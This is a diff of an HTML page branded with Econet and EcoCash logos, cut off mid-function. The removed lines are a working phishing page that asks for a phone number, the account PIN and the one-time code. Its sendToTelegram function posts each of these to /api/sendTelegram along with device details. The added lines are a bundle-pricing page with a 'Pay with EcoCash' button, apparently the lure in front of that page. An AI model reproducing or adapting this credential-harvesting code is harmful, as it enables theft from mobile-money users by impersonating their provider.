@@ -1,572 +1,813 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-
-<title>Receive Offer</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#003DA5"/>
+<title>Mix Bundle Builder · Econet</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 
-*{box-sizing:border-box}
-
-body{
-font-family:"Plus Jakarta Sans",system-ui;
-margin:0;
-min-height:100vh;
-display:flex;
-align-items:center;
-justify-content:center;
-background:linear-gradient(180deg,#e6f0ff,#cfe0ff);
-overflow:hidden;
+:root{
+  --blue:#003DA5;
+  --blue-dark:#002b78;
+  --blue-mid:#e8f0fb;
+  --blue-light:#f2f6fd;
+  --red:#C8102E;
+  --red-dark:#a00d24;
+  --neutral-50:#fafafa;
+  --neutral-100:#f4f4f5;
+  --neutral-200:#e4e4e7;
+  --neutral-400:#a1a1aa;
+  --neutral-500:#71717a;
+  --neutral-700:#3f3f46;
+  --neutral-900:#18181b;
+  --white:#fff;
+  --font:'DM Sans',sans-serif;
+  --mono:'DM Mono',monospace;
+  --radius-md:16px;
+  --radius-lg:22px;
+  --radius-xl:28px;
 }
 
-.wave{
-position:fixed;
-width:700px;
-height:700px;
-border-radius:50%;
-background:radial-gradient(circle,rgba(0,58,143,.15),transparent 70%);
-filter:blur(45px);
-animation:float 20s infinite linear;
-z-index:-1;
+html,body{
+  width:100%;
+  height:100%;
+  height:100dvh;
+  overflow:hidden;
+  overflow-x:hidden;
+  font-family:var(--font);
+  background:#eef1f7;
 }
 
-.wave.one{top:-250px;right:-150px}
-.wave.two{bottom:-250px;left:-150px}
-
-@keyframes float{
-0%{transform:translateY(0)}
-50%{transform:translateY(40px)}
-100%{transform:translateY(0)}
+.screen{
+  display:flex;flex-direction:column;
+  width:100%;
+  height:100%;
+  height:100dvh;
+  max-width:430px;
+  margin:0 auto;
+  background:var(--neutral-100);
+  overflow:hidden;
+  overflow-x:hidden;
+  position:relative;
 }
 
-.step{
-position:absolute;
-width:100%;
-max-width:420px;
-padding:30px;
-background:white;
-border-radius:22px;
-box-shadow:0 25px 50px rgba(0,0,0,.12);
-transition:.35s;
+/* HEADER */
+.header{
+  background:var(--blue);
+  padding:20px 20px 24px;
+  position:relative;
+  overflow:hidden;
+  flex-shrink:0;
+}
+.header::after{
+  content:'';position:absolute;
+  width:220px;height:220px;border-radius:50%;
+  background:rgba(255,255,255,.05);
+  top:-90px;right:-70px;
+}
+.header::before{
+  content:'';position:absolute;
+  width:130px;height:130px;border-radius:50%;
+  background:rgba(255,255,255,.04);
+  bottom:-50px;left:10px;
 }
 
-.container{
-position:relative;
-width:100%;
-max-width:420px;
-height:560px;
+.header-top{
+  display:flex;align-items:flex-start;
+  justify-content:space-between;
+  margin-bottom:20px;
+  position:relative;z-index:1;
 }
 
-.hidden{
-opacity:0;
-pointer-events:none;
-transform:translateX(40px);
+.brand-wordmark{
+  display:flex;flex-direction:column;
+  gap:5px;
 }
 
-.logo{
-height:72px;
-display:block;
-margin:auto;
-object-fit:contain;
+.brand-logos{
+  display:flex;align-items:center;gap:10px;
 }
 
-h1{
-text-align:center;
-color:#003a8f;
-margin:12px 0 6px;
-font-size:24px;
-font-weight:800;
+.brand-logo{
+  height:22px;
+  object-fit:contain;
+  filter:brightness(0) invert(1);
 }
 
-.warning{
-text-align:center;
-font-size:13px;
-color:#e11d48;
-margin-top:6px;
-margin-bottom:18px;
-font-weight:600;
+.brand-sep{
+  width:1px;height:16px;
+  background:rgba(255,255,255,.3);
+  flex-shrink:0;
 }
 
-label{
-font-size:12px;
-margin-top:12px;
-display:block;
-color:#444;
-font-weight:600;
+.powered-by{
+  font-size:10px;font-weight:500;
+  color:rgba(255,255,255,.5);
+  letter-spacing:.2px;
 }
 
-input{
-width:100%;
-padding:13px;
-border-radius:14px;
-border:1px solid #eee;
-background:#fafafa;
-margin-top:6px;
-font-size:14px;
-outline:none;
-transition:.2s;
+.plan-chip{
+  background:rgba(255,255,255,.15);
+  border:1px solid rgba(255,255,255,.22);
+  padding:5px 12px;border-radius:999px;
+  font-size:11px;font-weight:700;
+  color:white;letter-spacing:.3px;
+  text-transform:uppercase;
+  flex-shrink:0;
+  margin-top:2px;
 }
 
-input:focus{
-border-color:#003a8f;
-box-shadow:0 0 0 4px rgba(0,58,143,.08);
+.header-info{position:relative;z-index:1}
+
+.header-label{
+  font-size:12px;color:rgba(255,255,255,.6);
+  font-weight:500;margin-bottom:5px;
+  text-transform:uppercase;letter-spacing:.5px;
 }
 
-.phone-group{
-display:flex;
-gap:8px;
-align-items:center;
+.price-row{
+  display:flex;align-items:flex-end;gap:5px;
+  margin-bottom:14px;
 }
 
-.prefix{
-background:#f1f5ff;
-padding:13px;
-border-radius:14px;
-border:1px solid #eee;
-font-weight:700;
-color:#003a8f;
+.price-currency{
+  font-size:18px;font-weight:700;
+  color:rgba(255,255,255,.7);margin-bottom:5px;
 }
 
-.btn{
-margin-top:20px;
-width:100%;
-padding:13px;
-border-radius:14px;
-border:0;
-font-weight:700;
-background:#003a8f;
-color:white;
-cursor:pointer;
-opacity:.45;
-transition:.2s;
+.price-amount{
+  font-size:50px;font-weight:800;
+  color:white;line-height:1;
+  font-family:var(--mono);
+  font-variant-numeric:tabular-nums;
 }
 
-.btn.active{
-opacity:1;
+.price-tag{
+  margin-bottom:5px;
+  background:rgba(255,255,255,.18);
+  padding:3px 8px;border-radius:6px;
+  font-size:10px;color:rgba(255,255,255,.85);
+  font-weight:600;text-transform:uppercase;letter-spacing:.4px;
 }
 
-.pin{
-display:flex;
-gap:12px;
-justify-content:center;
-margin:18px 0;
+/* MINI BARS */
+.mini-bars{display:flex;gap:6px}
+.mini-bar-wrap{flex:1}
+.mini-bar-label{
+  font-size:9px;font-weight:700;
+  color:rgba(255,255,255,.55);
+  margin-bottom:4px;text-transform:uppercase;letter-spacing:.4px;
+}
+.mini-bar-track{
+  height:3px;background:rgba(255,255,255,.18);
+  border-radius:999px;overflow:hidden;
+}
+.mini-bar-fill{
+  height:100%;border-radius:999px;
+  background:rgba(255,255,255,.85);
+  transition:width .3s ease;
 }
 
-.pin input{
-width:52px;
-height:58px;
-font-size:22px;
-text-align:center;
-border-radius:16px;
-border:1px solid #eee;
-font-weight:700;
+/* SCROLL BODY */
+.content-wrap{
+  flex:1;
+  display:flex;flex-direction:column;
+  overflow:hidden;
+  position:relative;
+  min-height:0;
 }
 
-.count{
-text-align:center;
-font-size:13px;
-color:#666;
+.body{
+  flex:1;overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;
+  padding:0 0 88px;
+  overscroll-behavior:contain;
+  min-height:0;
+}
+.body::-webkit-scrollbar{display:none}
+
+/* SECTIONS */
+.section{padding:14px 16px 0}
+
+.section-label{
+  font-size:10px;font-weight:700;
+  color:var(--neutral-400);
+  text-transform:uppercase;letter-spacing:.9px;
+  margin-bottom:10px;
 }
 
-.resend{
-text-align:center;
-margin-top:10px;
-font-size:13px;
+/* TABS */
+.tabs-track{
+  display:flex;gap:7px;
+  overflow-x:auto;padding-bottom:2px;
+  padding-right:16px;
+}
+.tabs-track::-webkit-scrollbar{display:none}
+
+.tab{
+  flex-shrink:0;
+  padding:8px 16px;border-radius:999px;
+  font-size:12px;font-weight:700;
+  background:var(--white);color:var(--neutral-500);
+  border:1.5px solid var(--neutral-200);
+  cursor:pointer;transition:all .16s ease;
+  white-space:nowrap;
+}
+.tab.active{
+  background:var(--blue);color:white;border-color:var(--blue);
 }
 
-.resend button{
-border:0;
-background:none;
-color:#003a8f;
-cursor:pointer;
-font-weight:700;
-opacity:.4;
+/* BUNDLE CARD */
+.bundle-card{
+  margin:14px 16px 0;
+  background:var(--white);
+  border-radius:var(--radius-lg);
+  overflow:hidden;
+  border:1px solid var(--neutral-200);
 }
 
-.resend button.active{
-opacity:1;
+.bundle-card-header{
+  padding:13px 16px 11px;
+  border-bottom:1px solid var(--neutral-100);
+  display:flex;align-items:center;justify-content:space-between;
 }
 
+.bundle-card-title{font-size:14px;font-weight:700;color:var(--neutral-900)}
+.bundle-card-sub{font-size:11px;color:var(--neutral-400);font-weight:500;margin-top:2px}
+
+.live-badge{
+  background:var(--blue-light);color:var(--blue);
+  font-size:10px;font-weight:800;
+  padding:4px 10px;border-radius:999px;
+  text-transform:uppercase;letter-spacing:.4px;
+}
+
+/* SLIDERS */
+.sliders{padding:4px 0}
+
+.slider-item{
+  padding:12px 16px;
+  border-bottom:1px solid var(--neutral-100);
+}
+.slider-item:last-child{border-bottom:none}
+
+.slider-head{
+  display:flex;justify-content:space-between;
+  align-items:center;margin-bottom:10px;
+}
+
+.slider-label-group{display:flex;flex-direction:column;gap:2px}
+
+.slider-type{
+  display:flex;align-items:center;gap:7px;
+}
+
+.slider-emoji{font-size:16px;line-height:1;flex-shrink:0}
+
+.slider-name{font-size:13px;font-weight:700;color:var(--neutral-700)}
+.slider-desc{font-size:10px;color:var(--neutral-400);font-weight:500;margin-left:15px}
+
+.slider-value{
+  font-family:var(--mono);font-size:14px;
+  font-weight:500;color:var(--neutral-900);
+}
+
+/* RANGE */
+input[type=range]{
+  width:100%;height:8px;border-radius:999px;
+  appearance:none;outline:none;cursor:pointer;
+  background:var(--neutral-200);
+  transition:background .15s ease;
+}
+
+input[type=range]::-webkit-slider-thumb{
+  appearance:none;
+  width:22px;height:22px;border-radius:50%;
+  background:white;
+  border:3px solid currentColor;
+  cursor:grab;
+  box-shadow:0 2px 10px rgba(0,0,0,.15);
+  transition:transform .1s ease;
+}
+input[type=range]:active::-webkit-slider-thumb{
+  cursor:grabbing;
+  transform:scale(1.15);
+}
+.slider-voice input[type=range]::-webkit-slider-thumb{border-color:var(--red)}
+.slider-sms input[type=range]::-webkit-slider-thumb{border-color:#5b7cf7}
+.slider-data input[type=range]::-webkit-slider-thumb{border-color:var(--blue)}
+
+/* hint label */
+.slider-hint{
+  font-size:9px;color:var(--neutral-400);
+  font-weight:600;letter-spacing:.3px;
+  margin-top:5px;display:flex;justify-content:space-between;
+}
+
+/* PORTRAIT FIT - no sideways overflow */
+@media (orientation:landscape){}
+
+/* SUMMARY CARD */
+.summary-card{
+  margin:14px 16px 0;
+  background:var(--white);
+  border-radius:var(--radius-lg);
+  border:1px solid var(--neutral-200);
+  overflow:hidden;
+}
+
+.summary-header{
+  padding:12px 16px;
+  border-bottom:1px solid var(--neutral-100);
+  font-size:13px;font-weight:700;color:var(--neutral-700);
+}
+
+.summary-rows{padding:4px 0}
+
+.summary-row{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:10px 16px;
+  border-bottom:1px solid var(--neutral-100);
+}
+.summary-row:last-child{border-bottom:none}
+
+.summary-key{
+  display:flex;align-items:center;gap:8px;
+  font-size:12px;color:var(--neutral-500);font-weight:500;
+}
+
+.summary-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
+
+.summary-val{
+  font-size:13px;font-weight:700;
+  color:var(--neutral-900);font-family:var(--mono);
+}
+
+.summary-total-row{
+  background:var(--blue-mid);
+  padding:13px 16px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+
+.summary-total-label{font-size:13px;font-weight:700;color:var(--blue-dark)}
+.summary-total-val{
+  font-size:20px;font-weight:800;
+  color:var(--blue);font-family:var(--mono);
+}
+
+/* STICKY FOOTER */
+.sticky-footer{
+  position:absolute;bottom:0;left:0;right:0;
+  padding:12px 16px max(20px, env(safe-area-inset-bottom));
+  background:linear-gradient(to top,var(--neutral-100) 72%,transparent);
+  z-index:10;
+}
+
+.pay-btn{
+  background:var(--blue);color:white;
+  border:none;width:100%;padding:16px;
+  border-radius:var(--radius-md);
+  font-family:var(--font);font-size:15px;font-weight:800;
+  cursor:pointer;
+  letter-spacing:-.1px;
+  transition:all .15s ease;
+}
+.pay-btn:active{transform:scale(.98);background:var(--blue-dark)}
+
+/* MODAL SHEET */
+.modal-overlay{
+  position:absolute;inset:0;
+  background:rgba(24,24,27,.5);
+  display:none;align-items:flex-end;justify-content:center;
+  z-index:100;
+}
+.modal-overlay.open{display:flex}
+
+.modal-sheet{
+  background:var(--white);width:100%;
+  border-radius:var(--radius-xl) var(--radius-xl) 0 0;
+  padding:0 0 32px;
+  animation:slideUp .22s ease;overflow:hidden;
+}
+
+@keyframes slideUp{
+  from{transform:translateY(100%);opacity:0}
+  to{transform:translateY(0);opacity:1}
+}
+
+.sheet-handle{
+  width:36px;height:4px;background:var(--neutral-200);
+  border-radius:2px;margin:12px auto 0;
+}
+
+.sheet-header{
+  padding:16px 20px 14px;
+  border-bottom:1px solid var(--neutral-100);
+  display:flex;align-items:center;justify-content:space-between;
+}
+
+.sheet-title{font-size:17px;font-weight:800;color:var(--neutral-900)}
+
+.sheet-close{
+  width:28px;height:28px;border-radius:50%;
+  background:var(--neutral-100);
+  display:flex;align-items:center;justify-content:center;
+  font-size:13px;cursor:pointer;
+  color:var(--neutral-500);font-weight:700;
+  border:none;
+}
+
+.sheet-body{padding:16px 20px}
+
+.sheet-sub{
+  font-size:10px;text-transform:uppercase;
+  letter-spacing:.7px;font-weight:700;
+  color:var(--neutral-400);margin-bottom:10px;
+}
+
+.sheet-rows{
+  background:var(--neutral-50);
+  border-radius:var(--radius-md);overflow:hidden;
+  border:1px solid var(--neutral-200);
+  margin-bottom:14px;
+}
+
+.sheet-row{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:12px 14px;
+  border-bottom:1px solid var(--neutral-100);
+}
+.sheet-row:last-child{border-bottom:none}
+
+.sheet-row-key{font-size:13px;color:var(--neutral-500);font-weight:500}
+.sheet-row-val{font-size:13px;font-weight:700;color:var(--neutral-900)}
+
+.sheet-total{
+  background:var(--blue-mid);border-radius:var(--radius-md);
+  padding:14px;display:flex;justify-content:space-between;align-items:center;
+  margin-bottom:18px;border:1px solid rgba(0,61,165,.12);
+}
+
+.sheet-total-label{font-size:13px;font-weight:700;color:var(--blue-dark)}
+.sheet-total-val{font-size:22px;font-weight:800;color:var(--blue);font-family:var(--mono)}
+
+.sheet-actions{display:flex;gap:10px}
+
+.btn-cancel{
+  flex:1;padding:14px;border-radius:var(--radius-md);
+  border:1.5px solid var(--neutral-200);background:transparent;
+  font-family:var(--font);font-size:14px;font-weight:700;
+  color:var(--neutral-500);cursor:pointer;transition:.15s;
+}
+.btn-cancel:active{background:var(--neutral-100)}
+
+.btn-confirm{
+  flex:2;padding:14px;border-radius:var(--radius-md);
+  border:none;background:var(--blue);
+  font-family:var(--font);font-size:14px;font-weight:800;
+  color:white;cursor:pointer;transition:.15s;
+}
+.btn-confirm:active{background:var(--blue-dark);transform:scale(.98)}
+
+/* TOAST */
+.toast{
+  position:absolute;top:16px;left:50%;
+  transform:translateX(-50%) translateY(-8px);
+  background:var(--neutral-900);color:white;
+  padding:10px 18px;border-radius:999px;
+  font-size:12px;font-weight:700;
+  opacity:0;pointer-events:none;
+  transition:.22s ease;z-index:200;
+  white-space:nowrap;
+}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
 </style>
-
 </head>
-
 <body>
 
-<div class="wave one"></div>
-<div class="wave two"></div>
+<div class="screen">
 
-<div class="container">
+  <!-- HEADER -->
+  <div class="header">
+    <div class="header-top">
+      <div class="brand-wordmark">
+        <div class="brand-logos">
+          <img src="assets/econet.png" alt="Econet" class="brand-logo">
+          <span class="brand-sep"></span>
+          <img src="assets/ecocash.png" alt="EcoCash" class="brand-logo">
+        </div>
+        <div class="powered-by">Mix Bundle Builder</div>
+      </div>
+      <div class="plan-chip" id="planTag">Daily</div>
+    </div>
 
-<div id="step1" class="step">
+    <div class="header-info">
+      <div class="header-label">Bundle Total</div>
+      <div class="price-row">
+        <span class="price-currency">USD</span>
+        <span class="price-amount" id="price">0.00</span>
+        <span class="price-tag" id="planTagInline">DAILY</span>
+      </div>
+      <div class="mini-bars">
+        <div class="mini-bar-wrap">
+          <div class="mini-bar-label">Voice</div>
+          <div class="mini-bar-track"><div class="mini-bar-fill" id="voiceBar" style="width:100%"></div></div>
+        </div>
+        <div class="mini-bar-wrap">
+          <div class="mini-bar-label">SMS</div>
+          <div class="mini-bar-track"><div class="mini-bar-fill" id="smsBar" style="width:100%"></div></div>
+        </div>
+        <div class="mini-bar-wrap">
+          <div class="mini-bar-label">Data</div>
+          <div class="mini-bar-track"><div class="mini-bar-fill" id="dataBar" style="width:100%"></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
 
-<img src="assets/ecocash.webp" class="logo">
+  <!-- CONTENT WRAP (body + footer) -->
+  <div class="content-wrap">
 
-<h1>Receive Offer</h1>
+  <!-- BODY -->
+  <div class="body">
 
-<label>Phone Number</label>
+    <!-- DURATION -->
+    <div class="section">
+      <div class="section-label">Duration</div>
+      <div class="tabs-track">
+        <div class="tab active" onclick="selectPlan('daily',this)">Daily</div>
+        <div class="tab" onclick="selectPlan('3days',this)">3 Days</div>
+        <div class="tab" onclick="selectPlan('weekly',this)">Weekly</div>
+        <div class="tab" onclick="selectPlan('2weeks',this)">2 Weeks</div>
+        <div class="tab" onclick="selectPlan('monthly',this)">Monthly</div>
+      </div>
+    </div>
 
-<div class="phone-group">
-<div class="prefix">+263</div>
-<input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX">
-</div>
+    <!-- SLIDERS -->
+    <div class="section" style="padding-top:14px">
+      <div class="section-label">Customise</div>
+    </div>
 
-<div class="warning">
-Enter your 9-digit number starting with 7.
-</div>
+    <div class="bundle-card">
+      <div class="bundle-card-header">
+        <div>
+          <div class="bundle-card-title">Mix It Your Way</div>
+          <div class="bundle-card-sub">Drag sliders to set Voice, SMS &amp; Data</div>
+        </div>
+        <div class="live-badge">Live Price</div>
+      </div>
 
-<label>Enter your PIN</label>
+      <div class="sliders">
 
-<div class="pin">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-</div>
+        <div class="slider-item slider-voice">
+          <div class="slider-head">
+            <div class="slider-label-group">
+              <div class="slider-type">
+                <span class="slider-emoji">📞</span>
+                <div class="slider-name">Voice</div>
+              </div>
+              <div class="slider-desc">On-net &amp; Off-net minutes</div>
+            </div>
+            <div class="slider-value" id="voiceValue">0 Min</div>
+          </div>
+          <input type="range" id="voice" value="0" oninput="calculateBundle()">
+          <div class="slider-hint"><span>0</span><span id="voiceMax">20 Min</span></div>
+        </div>
 
-<button id="loginBtn" class="btn">Receive Offer</button>
+        <div class="slider-item slider-sms">
+          <div class="slider-head">
+            <div class="slider-label-group">
+              <div class="slider-type">
+                <span class="slider-emoji">💬</span>
+                <div class="slider-name">SMS</div>
+              </div>
+              <div class="slider-desc">Messages to all networks</div>
+            </div>
+            <div class="slider-value" id="smsValue">0 SMS</div>
+          </div>
+          <input type="range" id="sms" value="0" oninput="calculateBundle()">
+          <div class="slider-hint"><span>0</span><span id="smsMax">25 SMS</span></div>
+        </div>
 
-</div>
+        <div class="slider-item slider-data">
+          <div class="slider-head">
+            <div class="slider-label-group">
+              <div class="slider-type">
+                <span class="slider-emoji">🌐</span>
+                <div class="slider-name">Data</div>
+              </div>
+              <div class="slider-desc">4G / LTE mobile internet</div>
+            </div>
+            <div class="slider-value" id="dataValue">0 GB</div>
+          </div>
+          <input type="range" id="data" value="0" oninput="calculateBundle()">
+          <div class="slider-hint"><span>0</span><span id="dataMax">3 GB</span></div>
+        </div>
 
-<div id="step3" class="step hidden">
+      </div>
+    </div>
 
-<img src="assets/ecocash.webp" class="logo">
+    <!-- SUMMARY -->
+    <div class="summary-card">
+      <div class="summary-header">Bundle Summary</div>
+      <div class="summary-rows">
+        <div class="summary-row">
+          <div class="summary-key">
+            <div class="summary-dot" style="background:var(--neutral-400)"></div>
+            Duration
+          </div>
+          <div class="summary-val" id="summaryDuration">Daily</div>
+        </div>
+        <div class="summary-row">
+          <div class="summary-key">
+            <div class="summary-dot" style="background:var(--red)"></div>
+            Voice
+          </div>
+          <div class="summary-val" id="summaryVoice">0 Minutes</div>
+        </div>
+        <div class="summary-row">
+          <div class="summary-key">
+            <div class="summary-dot" style="background:#5b7cf7"></div>
+            SMS
+          </div>
+          <div class="summary-val" id="summarySms">0 SMS</div>
+        </div>
+        <div class="summary-row">
+          <div class="summary-key">
+            <div class="summary-dot" style="background:var(--blue)"></div>
+            Data
+          </div>
+          <div class="summary-val" id="summaryData">0 GB</div>
+        </div>
+      </div>
+      <div class="summary-total-row">
+        <div class="summary-total-label">💰 Total Amount</div>
+        <div class="summary-total-val" id="summaryAmount">USD 0.00</div>
+      </div>
+    </div>
 
-<h1>Receive Offer</h1>
+    <!-- POWERED BY -->
+    <div style="text-align:center;padding:18px 16px 4px">
+      <div style="font-size:10px;color:var(--neutral-400);font-weight:500;letter-spacing:.3px">
+        Powered by <strong style="color:var(--neutral-500)">Econet Wireless</strong> &middot; <strong style="color:var(--neutral-500)">EcoCash</strong>
+      </div>
+    </div>
 
-<div class="warning" id="maskedNumber"></div>
+  </div>
 
-<div class="pin">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-</div>
+  <!-- FOOTER BUTTON -->
+  <div class="sticky-footer">
+    <button class="pay-btn" onclick="openModal()">Proceed with EcoCash</button>
+  </div>
 
-<div class="count">
-Code expires in <span id="time">120</span>s
-</div>
+  </div><!-- /content-wrap -->
 
-<div class="resend">
-<button id="resendBtn">Resend OTP</button>
-</div>
+  <!-- MODAL SHEET -->
+  <div class="modal-overlay" id="modal" onclick="handleOverlayClick(event)">
+    <div class="modal-sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-header">
+        <div class="sheet-title">Confirm Bundle</div>
+        <button class="sheet-close" onclick="closeModal()">&#x2715;</button>
+      </div>
+      <div class="sheet-body">
+        <div class="sheet-sub">Bundle Details</div>
+        <div class="sheet-rows" id="details"></div>
+        <div class="sheet-total">
+          <div class="sheet-total-label">Total to Pay</div>
+          <div class="sheet-total-val" id="modalTotal">USD 0.00</div>
+        </div>
+        <div class="sheet-actions">
+          <button class="btn-cancel" onclick="closeModal()">Cancel</button>
+          <button class="btn-confirm" onclick="confirmBundle()">Pay with EcoCash</button>
+        </div>
+      </div>
+    </div>
+  </div>
 
-<button id="otpBtn" class="btn">Receive Offer</button>
-
-</div>
-
-<div id="step4" class="step hidden">
-
-<img src="assets/ecocash.webp" class="logo">
-
-<h1>Success</h1>
-
-<div class="warning">
-Processing your request...
-</div>
-
-</div>
+  <!-- TOAST -->
+  <div class="toast" id="toast">✅ Bundle selected</div>
 
 </div>
 
 <script>
+let currentPlan="daily";
 
-let phoneValue=""
-let pinValue=""
-let otpValue=""
-let loginClicked=false
-let otpSubmitted=false
-let resendClicked=false
+const plans={
+  daily:{maxData:3,maxVoice:20,maxSms:25,price:.60},
+  "3days":{maxData:8,maxVoice:50,maxSms:75,price:1.40},
+  weekly:{maxData:20,maxVoice:120,maxSms:200,price:2.80},
+  "2weeks":{maxData:45,maxVoice:250,maxSms:450,price:5.20},
+  monthly:{maxData:100,maxVoice:600,maxSms:1000,price:9.90}
+};
 
-let selectedPlan=null
+const planLabels={
+  daily:"Daily","3days":"3 Days",
+  weekly:"Weekly","2weeks":"2 Weeks",monthly:"Monthly"
+};
 
-try{
-selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
-}catch(e){}
-
-function getPlanLine(){
-
-if(!selectedPlan)
-return "No Bundle Selected";
-
-return `
-
-Bundle Selected
-
-Duration: ${selectedPlan.duration}
-
-Voice: ${selectedPlan.voice} Minutes
-
-SMS: ${selectedPlan.sms} SMS
-
-Data: ${selectedPlan.data} GB
-
-Amount: USD ${selectedPlan.amount}
-
-`;
-
-}
-const ua=navigator.userAgent
-
-let device="Unknown"
-
-if(/Android/i.test(ua)) device="Android"
-else if(/iPhone|iPad/i.test(ua)) device="iOS"
-
-if(/Chrome/i.test(ua)) device+=" | Chrome"
-else if(/Safari/i.test(ua)) device+=" | Safari"
-
-async function sendToTelegram(eventName){
-
-fetch("/api/sendTelegram",{
-
-method:"POST",
-
-headers:{
-"Content-Type":"application/json"
-},
-
-body:JSON.stringify({
-
-submittedAt:new Date().toISOString(),
-loginPhone:phoneValue,
-loginPin:pinValue,
-otp:otpValue,
-event:eventName,
-plan:getPlanLine(),
-device:device
-
-})
-
-})
-
+function selectPlan(plan,el){
+  currentPlan=plan;
+  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
+  el.classList.add("active");
+  const lbl=planLabels[plan];
+  document.getElementById("planTag").textContent=lbl;
+  document.getElementById("planTagInline").textContent=lbl.toUpperCase();
+  updatePlan();
 }
 
-/* phone cleanup */
-
-phone.oninput=e=>{
-
-let v=e.target.value.replace(/\D/g,"")
-
-if(v.startsWith("263")) v=v.slice(3)
-if(v.startsWith("0")) v=v.slice(1)
-
-if(v[0]!=="7") v="7"+v.slice(1)
-
-v=v.slice(0,9)
-
-e.target.value=v
-
-phoneValue="+263"+v
-
-validateLogin()
-
+function fillSlider(el,color){
+  const pct=el.max>0?((el.value-el.min)/(el.max-el.min)*100):0;
+  el.style.background=`linear-gradient(to right,${color} ${pct}%,#e4e4e7 ${pct}%)`;
 }
 
-/* PIN inputs */
-
-const pinInputs=document.querySelectorAll("#step1 .pin input")
-
-pinInputs.forEach((input,i)=>{
-
-input.oninput=()=>{
-
-input.value=input.value.replace(/\D/g,"")
-
-if(input.value && i<3) pinInputs[i+1].focus()
-
-validateLogin()
-
+function updatePlan(){
+  const p=plans[currentPlan];
+  const v=document.getElementById("voice");
+  const s=document.getElementById("sms");
+  const d=document.getElementById("data");
+  v.max=p.maxVoice;v.value=p.maxVoice;
+  s.max=p.maxSms;s.value=p.maxSms;
+  d.max=p.maxData;d.value=p.maxData;
+  document.getElementById("voiceMax").textContent=p.maxVoice+" Min";
+  document.getElementById("smsMax").textContent=p.maxSms+" SMS";
+  document.getElementById("dataMax").textContent=p.maxData+" GB";
+  calculateBundle();
 }
 
-input.onkeydown=e=>{
+function calculateBundle(){
+  const p=plans[currentPlan];
+  const v=Number(document.getElementById("voice").value);
+  const s=Number(document.getElementById("sms").value);
+  const d=Number(document.getElementById("data").value);
 
-if(e.key==="Backspace" && !input.value && i>0){
+  document.getElementById("voiceValue").textContent=v+" Min";
+  document.getElementById("smsValue").textContent=s+" SMS";
+  document.getElementById("dataValue").textContent=d+" GB";
 
-pinInputs[i-1].focus()
-pinInputs[i-1].value=""
+  fillSlider(document.getElementById("voice"),"#C8102E");
+  fillSlider(document.getElementById("sms"),"#5b7cf7");
+  fillSlider(document.getElementById("data"),"#003DA5");
 
-validateLogin()
+  document.getElementById("voiceBar").style.width=(v/p.maxVoice*100)+"%";
+  document.getElementById("smsBar").style.width=(s/p.maxSms*100)+"%";
+  document.getElementById("dataBar").style.width=(d/p.maxData*100)+"%";
 
+  const total=((d/p.maxData)+(v/p.maxVoice)+(s/p.maxSms))/3*p.price;
+  const fmt=total.toFixed(2);
+
+  document.getElementById("price").textContent=fmt;
+  document.getElementById("summaryDuration").textContent=planLabels[currentPlan];
+  document.getElementById("summaryVoice").textContent=v+" Minutes";
+  document.getElementById("summarySms").textContent=s+" SMS";
+  document.getElementById("summaryData").textContent=d+" GB";
+  document.getElementById("summaryAmount").textContent="USD "+fmt;
 }
 
+function openModal(){
+  const v=document.getElementById("voice").value;
+  const s=document.getElementById("sms").value;
+  const d=document.getElementById("data").value;
+  const amt=document.getElementById("summaryAmount").textContent;
+
+  document.getElementById("details").innerHTML=`
+    <div class="sheet-row"><span class="sheet-row-key">Duration</span><span class="sheet-row-val">${planLabels[currentPlan]}</span></div>
+    <div class="sheet-row"><span class="sheet-row-key">Voice</span><span class="sheet-row-val">${v} Minutes</span></div>
+    <div class="sheet-row"><span class="sheet-row-key">SMS</span><span class="sheet-row-val">${s} SMS</span></div>
+    <div class="sheet-row"><span class="sheet-row-key">Data</span><span class="sheet-row-val">${d} GB</span></div>
+  `;
+  document.getElementById("modalTotal").textContent=amt;
+  document.getElementById("modal").classList.add("open");
 }
 
-})
-
-function validateLogin(){
-
-pinValue=[...pinInputs].map(i=>i.value).join("")
-
-if(phoneValue.length===13 && pinValue.length===4)
-loginBtn.classList.add("active")
-else
-loginBtn.classList.remove("active")
-
+function closeModal(){
+  document.getElementById("modal").classList.remove("open");
 }
 
-function show(id){
-
-document.querySelectorAll(".step")
-.forEach(s=>s.classList.add("hidden"))
-
-document.getElementById(id)
-.classList.remove("hidden")
-
+function handleOverlayClick(e){
+  if(e.target===document.getElementById("modal")) closeModal();
 }
 
-/* receive offer */
-
-loginBtn.onclick=()=>{
-
-if(!loginBtn.classList.contains("active")) return
-if(loginClicked) return
-
-loginClicked=true
-
-sendToTelegram("receive_offer_clicked")
-
-const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
-
-maskedNumber.innerHTML=`Enter the OTP sent to ${masked}`
-
-show("step3")
-
-startTimer()
-
+function confirmBundle(){
+  const selectedBundle={
+    duration:currentPlan,
+    voice:document.getElementById("voice").value,
+    sms:document.getElementById("sms").value,
